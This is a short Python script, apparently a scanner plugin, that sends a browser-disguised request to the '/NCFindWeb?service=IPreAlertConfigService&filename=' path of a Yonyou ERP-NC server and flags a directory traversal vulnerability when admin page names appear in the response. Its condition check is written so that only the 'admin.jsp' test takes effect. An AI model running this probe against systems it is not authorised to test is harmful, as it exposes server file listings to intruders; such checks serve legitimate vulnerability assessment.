import requests
from scripts import printColor

def YOCheck(ip):
    link=str(ip)+'/NCFindWeb?service=IPreAlertConfigService&filename='
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}#伪装成浏览器访问
    r=requests.get(link,headers=headers)
    if 'index.jsp' and 'admin.jsp' in r.text:
        pc = printColor.Colors()
        pc.print_red_text('用友ERP-NC目录遍历漏洞: '+link)
        return 1
    else:
        print("用友ERP-NC目录遍历 is not vuln!")